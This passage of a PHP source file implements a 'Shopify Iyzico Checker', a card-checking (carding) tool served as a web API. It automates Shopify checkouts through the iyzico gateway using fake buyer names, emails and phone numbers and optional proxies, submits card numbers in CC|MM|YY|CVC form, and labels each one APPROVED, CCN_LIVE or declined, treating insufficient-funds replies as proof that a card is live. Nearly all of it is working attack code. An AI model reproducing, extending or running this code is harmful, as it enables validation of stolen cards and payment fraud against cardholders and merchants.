                'registerConsumerCard' => false,
                'registerCard' => 0,
            ],
            'browserFingerprint' => [
                'language' => 'tr',
                'timezone' => -180,
                'hasSessionStorage' => true,
                'hasLocalStorage' => true,
                'hasIndexedDb' => true,
                'hasOpenDb' => true,
                'platform' => 'false',
                'hasLiedLanguage' => false,
                'hasLiedResolution' => false,
                'hasLiedOS' => false,
                'hasLiedBrowser' => false,
                'maxTouchPoints' => 0,
                'touchEventSuccess' => false,
                'hasTouchStart' => false,
                'fingerprintHash' => '',
            ],
            'pwiMetadata' => [
                'lightRedesign' => ['false'],
                'pwiGrowthActionDisabled' => ['false'],
            ],
        ]);

        $result = $this->request($url, 'POST', $headers, $postData, $iyziCookieStr);
        echo "[Step 6] iyzico Auth: HTTP {$result['status']}\n";
        echo "[Step 6] Response: {$result['body']}\n";

        return ['status' => $result['status'], 'body' => $result['body']];
    }

    public function check($site, $card_input, $proxy = '') {
        $startTime = microtime(true);

        // Set proxy
        if (!empty($proxy)) {
            $this->setProxy($proxy);
        }

        // Parse site URL
        $site = rtrim($site, '/');
        if (strpos($site, 'http') !== 0) {
            $site = 'https://' . $site;
        }
        
        // Extract base URL and product path
        $parsed = parse_url($site);
        $this->baseUrl = $parsed['scheme'] . '://' . $parsed['host'];
        $path = $parsed['path'] ?? '';
        
        // Extract product path from /products/slug
        if (preg_match('/\/products\/([^\/\?]+)/', $path, $m)) {
            $this->productPath = $m[1];
        } else {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Invalid site URL. Must contain /products/slug', $proxy);
        }

        // Parse card
        $parts = explode('|', $card_input);
        if (count($parts) != 4) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Invalid card format (CC|MM|YY|CVC)', $proxy);
        }

        $cc = trim($parts[0]);
        $mm = trim($parts[1]);
        $yy = trim($parts[2]);
        $cvv = trim($parts[3]);

        $email = 'user' . mt_rand(1000, 9999) . '@gmail.com';
        $firstName = 'Mehmet';
        $lastName = 'Yilmaz';
        $phone = '5' . mt_rand(300000000, 599999999);
        $holderName = "$firstName $lastName";

        // Step 0: Scrape product page
        if (!$this->scrapeProductPage()) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Failed to scrape product page', $proxy);
        }

        // Step 1: Add to cart
        if (!$this->addToCart()) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Add to cart failed', $proxy);
        }

        // Step 2: Get checkout
        if (!$this->getCheckout()) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Checkout page failed', $proxy);
        }

        // Step 3: Submit for completion
        $iyziUrl = $this->submitForCompletion($email, $firstName, $lastName, $phone);
        if (!$iyziUrl) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Submit for completion failed', $proxy);
        }

        // Step 4: Get iyzico page
        if (!$this->getIyzicoPage($iyziUrl)) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'Iyzico page failed', $proxy);
        }

        if (!$this->iyziToken) {
            return $this->buildResponse($card_input, 'ERROR', false, $startTime, 'No iyzico token', $proxy);
        }

        // Step 5: Countly analytics
        $this->sendCountly();

        // Step 6: Submit card
        $result = $this->submitCard($cc, $mm, $yy, $cvv, $holderName);
        $data = json_decode($result['body'], true);

        $responseCode = 'UNKNOWN';
        $isApproved = false;

        if ($data) {
            $status = $data['status'] ?? '';
            $errorCode = $data['errorCode'] ?? '';
            $errorMessage = $data['errorMessage'] ?? '';
            $paymentStatus = $data['paymentStatus'] ?? '';

            if ($status === 'success' || $paymentStatus === 'SUCCESS') {
                $responseCode = 'APPROVED';
                $isApproved = true;
            } elseif ($status === 'failure') {
                if (strpos($errorCode, '10051') !== false || strpos($errorMessage, 'bakiye') !== false || strpos($errorMessage, 'insufficient') !== false) {
                    $responseCode = 'CCN_LIVE';
                    $isApproved = true;
                } else {
                    $responseCode = 'CARD_DECLINED';
                }
            } else {
                $responseCode = 'CARD_DECLINED';
            }
        } else {
            $responseCode = 'ERROR';
        }

        return $this->buildResponse($card_input, $responseCode, $isApproved, $startTime, $result['body'], $proxy);
    }

    private function buildResponse($card_input, $responseCode, $status, $startTime, $rawResponse, $proxy) {
        $elapsed = round(microtime(true) - $startTime, 2);

        // Parse raw response for message
        $message = $responseCode;
        if ($rawResponse) {
            $decoded = json_decode($rawResponse, true);
            if ($decoded) {
                $message = $decoded['errorMessage'] ?? $decoded['status'] ?? $responseCode;
                if ($responseCode === 'CCN_LIVE') {
                    $message = 'CCN LIVE - ' . ($decoded['errorMessage'] ?? '');
                }
            } else {
                $message = substr($rawResponse, 0, 200);
            }
        }

        return json_encode([
            "Currency" => $this->currency ?: 'TRY',
            "Gateway" => "Shopify Payments",
            "Price" => $this->price ?: 0,
            "Proxy" => !empty($proxy) ? "Live" : "Direct",
            "Response" => $message,
            "Status" => $status,
            "Time" => $elapsed . "s",
            "cc" => $card_input
        ], JSON_PRETTY_PRINT);
    }
}

// ==========================================
// RAILWAY API ROUTER
// ==========================================

if (isset($_GET['shopify'])) {
    header('Content-Type: application/json');
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET');
    
    $site = $_GET['site'] ?? '';
    $cc = $_GET['cc'] ?? '';
    $proxy = $_GET['proxy'] ?? '';

    if (empty($site) || empty($cc)) {
        http_response_code(400);
        echo json_encode([
            "error" => "Missing required parameters",
            "usage" => "?shopify=&site=https://example.com/products/slug&cc=CC|MM|YY|CVC&proxy=ip:port (optional)"
        ], JSON_PRETTY_PRINT);
        exit;
    }

    $checker = new IyzicoChecker();
    echo $checker->check($site, $cc, $proxy);
    exit;
}

// Default response
header('Content-Type: application/json');
echo json_encode([
    "service" => "Shopify Iyzico Checker",
    "endpoint" => "/shopify",
    "params" => [
        "site" => "Full product URL (https://example.com/products/slug)",
        "cc" => "Card format: CC|MM|YY|CVC",
        "proxy" => "Optional (ip:port)"
    ],
    "example" => "/shopify?site=https://example.com/products/item&cc=4111111111111111|01|28|123"
], JSON_PRETTY_PRINT);
?>
